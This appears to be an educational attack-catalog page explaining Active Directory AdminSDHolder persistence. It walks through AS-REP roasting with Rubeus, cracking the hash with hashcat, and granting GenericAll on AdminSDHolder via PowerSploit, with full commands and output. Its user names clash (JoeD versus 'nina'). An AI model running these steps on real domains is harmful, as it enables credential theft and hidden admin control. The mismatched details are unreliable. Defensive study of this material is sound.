# Attack Catalog

Attack Catalog

Adversarial Techniques for Credential Theft and Data Compromise

* AdminSDHolder Modification
* AS-REP Roasting Attack
* DCShadow Attack
* DCSync Attack
* Golden SAML Attack
* Golden Ticket Attack
* Group Managed Service Accounts Attack
* Kerberoasting Attack
* LDAP Reconnaissance
* NTDS.dit Password Extraction
* Pass-the-Hash (PtH) Attack
* Pass-the-Ticket (PtT) Attack
* Passwords Spraying Attack
* Plaintext Password Extraction
* Silver Ticket Attack
* Zerologon Exploit Attack

| <img src="../.gitbook/assets/0 (4).png" alt="A blue and black logo

Description automatically generated" data-size="original"> | <p>AdminSDHolder Attack</p><p>Active Directory ✽ Defensive Evasion ✽ Persistence</p><p><em>AdminSDHolder n container serves as a gateway for threat actors to maintain persistent control over the system, bypassing security protocols and potentially leading to severe implications for the organization's overall cybersecurity posture.</em></p> |
| ------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
|                                                                                                                                |                                                                                                                                                                                                                                                                                                                                                       |

AdminSDHolder modification is a strategic persistence tactic used by cyber attackers to exploit vulnerabilities within the SDProp process of Active Directory. This technique involves manipulating the permissions set on crucial objects, such as Users with Domain Admin Privileges, by leveraging the comparison mechanism with the AdminSDHolder container. A key aspect of this approach is that the SDProp process, operating by default on an hourly basis, constantly monitors and synchronizes permissions to ensure consistency. When a disparity is detected between the permissions on the objects and those defined in AdminSDHolder, the system automatically adjusts to align with the latter. By illicitly altering the permissions within the AdminSDHolder container, malicious actors can establish a concealed route for unauthorized access, effectively creating a hidden path for shadow administration purposes. This unauthorized access not only compromises the integrity of Active Directory but also presents a significant security risk by providing a means for the adversary to regain administrative control. In essence, the manipulation of the AdminSDHolder container serves as a gateway for threat actors to maintain persistent control over the system, bypassing security protocols and potentially leading to severe implications for the organization's overall cybersecurity posture.

| **THREAT SUMMARY**      |                                          | **DIFFICULTY**  |        |
| ----------------------- | ---------------------------------------- | --------------- | ------ |
|                         |                                          |                 |        |
| **Target:**             | Active Directory                         | **Detection:**  | Low    |
| **Tools:**              | PowerSploit, Rubeus, AS-REP Roast        | **Mitigation:** | Medium |
| **ATT\&CK Tactic:**     | <p>Persistence</p><p>Defense Evasion</p> | **Response:**   | Low    |
| **ATT\&CK Techniques:** | N/A                                      |                 |        |

How the AdminSDHolder Modification Attack Works

Before an adversary, a rogue actor seeking to disrupt systems or access protected information, can tamper with the AdminSDHolder container, a crucial security component that puts restrictions on the permissions of privileged accounts within a domain, they must first obtain administrative privileges in the domain. This elevated access allows the adversary to override security protocols and make unauthorized changes to crucial elements such as access control lists (ACLs), potentially leading to widespread system compromise. In the scenario presented, a prime example illustrating a common tactic employed by adversaries in compromising privileged users and subsequently gaining unauthorized access to critical systems, the adversary cleverly employs a specialized tool known as Rubeus. This tool, infamous in the cybersecurity realm for its ability to exploit weaknesses in Kerberos authentication systems, aids the adversary in conducting an AS-REP roast attack against a particularly vulnerable user named JoeD. By exploiting the lack of Kerberos pre-authentication on JoeD's account, the adversary can intercept and manipulate authentication requests, ultimately compromising JoeD's credentials and paving the way for deeper intrusion into the domain's infrastructure. This sophisticated attack method underscores the ongoing challenges faced by organizations in safeguarding sensitive data and preventing malicious actors from exploiting vulnerabilities within authentication mechanisms.

**Step 1: Acquire the Required Privileges**

PS> .\Rubeus.exe asreproast /outfile:hashes.txt /format:hashcat

\[\*] Action: AS-REP roasting

\[\*] Target Domain : domain.com

\[\*] Target DC : dc1

\[\*] Searching path 'LDAP://dc1/DC=domain,DC=com' for AS-REP roastable users

\[\*] SamAccountName : nina

\[\*] DistinguishedName : CN=Nina Avlis,OU=Users,OU=Admin,DC=domain,DC=com

\[\*] Using domain controller: dc1 (10.154.201.1)

\[\*] Building AS-REQ (w/o preauth) for: 'domain.com\nina’

\[+] AS-REQ w/o preauth successful!

\[\*] Hash written to c:\Tools\Ghostpack\dotnet v4.5 compiled binaries\hashes.txt

\[\*] Roasted hashes written to : c:\Tools\Ghostpack\dotnet v4.5 compiled binaries\hashes.txt

PS> .\hashcat.exe -m 18200 -o cracked.txt -a 0 .\Hash.txt .\wordlist.txt

...

Session..........: hashcat

Status...........: Cracked

Hash.Name........: Kerberos 5, etype 23, AS-REP

Hash.Target......: $krb5asrep$23$nina@domain.com:e7d1f...2ac95c

Time.Started.....: Wed Aug 14 18:58:36 2024 (0 secs)

Time.Estimated...: Wed Aug 14 18:58:36 2024 (0 secs)

Guess.Base.......: File (.\wordlist.txt)

Guess.Queue......: 1/1 (100.00%)

Speed.#1.........: 97694 H/s (0.26ms) @ Accel:256 Loops:1 Thr:64 Vec:1

Recovered........: 1/1 (100.00%) Digests

Progress.........: 100/100 (100.00%)

Rejected.........: 0/100 (0.00%)

Restore.Point....: 0/100 (0.00%)

Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1

Candidates.#1....: 123456 -> jayden

Hardware.Mon.#1..: Temp: 47c Fan: 34% Util: 32% Core:1265MHz Mem:2504MHz Bus:16

PS> Get-Content .\cracked.txt

$krb5asrep$23$nina@domain.com:e7d1f86a67ca41137f9a0b45d24f5795$3f8e0e7a0d8055d91a3fa2c67b537949e7dc30f41b797e01fa459d774d0c10c3fbc2488c7bb634db93118bb5a8dfe99107899f56e2542d39fef9b27d893fbaa5e92acd207b059b548d456f9daa18b24f0c9e83af16898eec8e9dbde3128772924a3f10e09cd66fbede311b3c3a4aa45d9feb6c49178dbab65dd8e38af89b3ac0fad7bde16b0bb50e25c8f6f92d29d5d3a9dc8e633e31db73dd06aa2e2a5e97053f73fada97564248d048fc74b7e13d56016210e6a3d1f4e4c7cafb60007bec16d682b3fd210bdaa1d2f3d44c717f19cf1583e814d92ace43991d132be1897ebeaa8b78daa7b29f1a3e03301c3920da1cf9bd8a887a92fc79280734e5acb2fadcfa05895f0f2ac95c:P@ssword!23

\# domain\nina has a password of: P@ssword!23

The AS-REP roasting action was successfully performed on the domain.com network using the **Rubeus.exe** tool. The targeted domain controller was dc1, where the search for AS-REP roastable users began within the LDAP path 'LDAP://dc1/DC=domain,DC=com'. Among the users found, 'nina' with the SamAccountName and DistinguishedName of CN=Nina Avlis,OU=Users,OU=Admin,DC=domain,DC=com was identified. The AS-REQ (w/o preauth) was built for 'domain.com\nina' and the hash generated was stored in hashes.txt. The roasted hashes were also saved in the defined directory. Subsequently, using hashcat.exe, the Kerberos 5 hash for the user nina was cracked successfully, revealing the password: P@ssword!23. The robust processing power of hashcat was evident from the high hash cracking speed achieved. The cracked hash was confirmed through the content of cracked.txt, solidifying the disclosure of the password for domain\nina as P@ssword!23.

The provided script demonstrates the process of extracting and cracking an Active Directory (AD) user's AS-REP (Authentication Service Response) hash using Rubeus and then cracking the hash using Hashcat. Here's a breakdown of the steps involved:

1\. \*\*AS-REP Roasting with Rubeus\*\*: The script starts by running Rubeus with the \`asreproast\` command to identify users who have roastable AS-REPs. This is done by specifying an output file (\`hashes.txt\`) and the desired hash format (\`hashcat\`). The script targets a specific domain (\`domain.com\`) and domain controller (\`dc1\`). It searches for roastable users within the LDAP path corresponding to the domain and identifies a user named \`joed\`. The AS-REQ (authentication request) is successfully built without pre-authentication, and the hash for \`joed\` is saved to \`hashes.txt\`.

2\. \*\*Cracking the AS-REP Hash with Hashcat\*\*: Next, the script uses Hashcat to crack the AS-REP hash obtained from the previous step. It specifies the mode (\`-m 18200\` for Kerberos 5, etype 23, AS-REP), the output file for cracked hashes (\`cracked.txt\`), the attack mode (\`-a 0\` for straight mode), and the input files (the previously generated hash file and a wordlist). Hashcat processes the hash and attempts to crack it using the provided wordlist.

3\. \*\*Reviewing the Cracked Password\*\*: Finally, the script reads the cracked password from \`cracked.txt\` and prints it to the console, indicating that the password for the \`joed\` user is \`P@ssword!23\`.

This process showcases how attackers can leverage tools like Rubeus and Hashcat to extract and crack AD user credentials, highlighting the importance of securing AD environments against such attacks.

**Step 2: Modify the AdminSDHolders Access Control List (ACLs)**

After successfully deciphering the password hash for the JoeD account, which was acquired through AS-REP roasting, the malicious actor proceeds to authenticate themselves using the compromised password. To further escalate their privileges, they utilize a specific PowerSploit command known as Add-DomainObjectACL, through which they grant extensive rights and access on the AdminSDHolder container to another previously compromised user, BobT. By leveraging this method, the attacker is able to effectively elevate BobT's privileges within the network. The consequence of this action is that when the Security Descriptor Propagation (SDProp) process is triggered, the changes made to BobT's permissions will propagate across all the secured objects in the environment.

Moreover, this manipulation of the AdminSDHolder container opens up a pathway for the threat actor to extend their control and influence in the network, potentially causing significant damage or breaches in security. The insidious nature of this attack lies in its ability to blend in with normal user activities, making it harder to detect and mitigate by typical security measures. This type of advanced exploitation underscores the importance of implementing robust security protocols and continuously monitoring for unusual or unauthorized behavior on the network.

By meticulously exploiting this vulnerability and leveraging PowerSploit's toolset, the attacker effectively establishes a persistent threat within the network, utilizing compromised credentials and elevated privileges to maneuver through the system undetected. As a result, sensitive information and critical assets within the organization are put at risk, highlighting the critical need for proactive defense mechanisms and thorough security incident response protocols to safeguard against such sophisticated attacks.

PS> runas /noprofile /user:domain\joed powershell.exe

\# --- New Window Opens --- #

PS> Import-Module .\PowerSploit.psd1

PS> Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System' -PrincipalIdentity BobT -Rights All

PS> # Confirming Permissions Added

PS> Get-DomainObjectAcl -Identity \`CN=AdminSDHolder,CN=System\` -ResolveGUIDs

InheritedObjectType : All

ObjectDN : CN=AdminSDHolder,CN=System,DC=Domain,DC=com

ObjectType : All

IdentityReference : Domain\BobT

IsInherited : False

ActiveDirectoryRights : GenericAll

PropagationFlags : None

ObjectFlags : None

InheritanceFlags : None

InheritanceType : None

AccessControlType : Allow

ObjectSID :

After opening a new window by running the command "PS> runas /noprofile /user:domain\joed powershell.exe," you can proceed with additional tasks. Import the module from the local directory using the "Import-Module .\PowerSploit.psd1" command to add more functionality to your PowerShell session. Next, utilizing the "Add-DomainObjectAcl" cmdlet, grant specific permissions by targeting the identity 'CN=AdminSDHolder,CN=System' and assigning the principal identity BobT with All rights.

To confirm the successful addition of permissions, execute the "Get-DomainObjectAcl" cmdlet with the \`-Identity \`CN=AdminSDHolder,CN=System\`\` argument to retrieve detailed information regarding the access control list. You should see that the permissions have been appropriately applied, with details such as the InheritedObjectType being All, the IdentityReference reflecting Domain\BobT, and the ActiveDirectoryRights set to GenericAll. Moreover, ensure that the access control is direct and not inherited (IsInherited: False) and review the various flags such as PropagationFlags, ObjectFlags, and InheritanceFlags.

In summary, the command sequence provided allows for the efficient management of access control within Active Directory, showing a clear example of granting 'GenericAll' permissions to the specified principal identity, BobT, on the target object 'AdminSDHolder' situated in the CN=System container of the domain.
